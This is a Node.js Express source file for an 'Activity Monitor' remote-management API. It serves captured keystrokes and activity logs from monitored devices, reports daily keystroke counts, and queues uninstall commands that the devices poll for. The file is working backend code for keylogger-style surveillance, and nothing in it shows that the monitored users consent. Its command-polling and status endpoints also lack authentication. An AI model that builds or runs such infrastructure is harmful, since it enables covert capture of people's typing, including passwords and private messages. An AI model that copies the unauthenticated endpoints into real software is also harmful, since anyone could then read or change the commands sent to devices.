// remote-management-api.js
// Node.js API for remote management of Activity Monitor services

const express = require('express');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Supabase client
const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SERVICE_KEY
);

// In-memory storage for pending commands (in production, use Redis or database)
const pendingCommands = new Map();

// Middleware to verify API key
const verifyApiKey = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (!apiKey || apiKey !== process.env.API_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};

// Get all devices
app.get('/api/devices', verifyApiKey, async (req, res) => {
    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });
            
        if (error) throw error;
        
        res.json({
            success: true,
            devices: data,
            count: data.length
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Get device activities
app.get('/api/devices/:deviceId/activities', verifyApiKey, async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { limit = 100, offset = 0 } = req.query;
        
        const { data, error } = await supabase
            .from('activity_logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .range(offset, offset + limit - 1);
            
        if (error) throw error;
        
        res.json({
            success: true,
            activities: data,
            count: data.length
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Get device keystrokes
app.get('/api/devices/:deviceId/keystrokes', verifyApiKey, async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { limit = 100, offset = 0 } = req.query;
        
        const { data, error } = await supabase
            .from('key_logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .range(offset, offset + limit - 1);
            
        if (error) throw error;
        
        res.json({
            success: true,
            keystrokes: data,
            count: data.length
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Send uninstall command to device
app.post('/api/devices/:deviceId/uninstall', verifyApiKey, async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        // Check if device exists
        const { data: device, error: deviceError } = await supabase
            .from('devices')
            .select('*')
            .eq('id', deviceId)
            .single();
            
        if (deviceError || !device) {
            return res.status(404).json({
                success: false,
                error: 'Device not found'
            });
        }
        
        // Create uninstall command
        const commandId = `uninstall_${deviceId}_${Date.now()}`;
        const command = {
            id: commandId,
            device_id: deviceId,
            action: 'uninstall',
            status: 'pending',
            created_at: new Date().toISOString(),
            expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
        };
        
        // Store command in database
        const { error: commandError } = await supabase
            .from('device_commands')
            .insert(command);
            
        if (commandError) throw commandError;
        
        // Also store in memory for quick access
        pendingCommands.set(deviceId, command);
        
        res.json({
            success: true,
            message: 'Uninstall command queued',
            commandId: commandId
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Check for pending commands (called by devices)
app.get('/api/commands/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        // Check for pending commands
        const { data: commands, error } = await supabase
            .from('device_commands')
            .select('*')
            .eq('device_id', deviceId)
            .eq('status', 'pending')
            .order('created_at', { ascending: false });
            
        if (error) throw error;
        
        res.json({
            success: true,
            commands: commands || []
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Update command status
app.put('/api/commands/:commandId/status', async (req, res) => {
    try {
        const { commandId } = req.params;
        const { status, result } = req.body;
        
        const { error } = await supabase
            .from('device_commands')
            .update({
                status: status,
                result: result,
                completed_at: new Date().toISOString()
            })
            .eq('id', commandId);
            
        if (error) throw error;
        
        res.json({
            success: true,
            message: 'Command status updated'
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Get dashboard statistics
app.get('/api/stats', verifyApiKey, async (req, res) => {
    try {
        // Get device count
        const { count: deviceCount } = await supabase
            .from('devices')
            .select('*', { count: 'exact', head: true });
        
        // Get online devices (last seen within 5 minutes)
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const { count: onlineCount } = await supabase
            .from('devices')
            .select('*', { count: 'exact', head: true })
            .gte('last_seen', fiveMinutesAgo);
        
        // Get activity count (last 24 hours)
        const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
        const { count: activityCount } = await supabase
            .from('activity_logs')
            .select('*', { count: 'exact', head: true })
            .gte('timestamp', twentyFourHoursAgo);
        
        // Get keystroke count (last 24 hours)
        const { count: keystrokeCount } = await supabase
            .from('key_logs')
            .select('*', { count: 'exact', head: true })
            .gte('timestamp', twentyFourHoursAgo);
        
        res.json({
            success: true,
            stats: {
                totalDevices: deviceCount || 0,
                onlineDevices: onlineCount || 0,
                activitiesLast24h: activityCount || 0,
                keystrokesLast24h: keystrokeCount || 0
            }
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        success: true,
        message: 'Remote Management API is running',
        timestamp: new Date().toISOString()
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Remote Management API running on port ${PORT}`);
    console.log(`Health check: http://localhost:${PORT}/health`);
});

module.exports = app;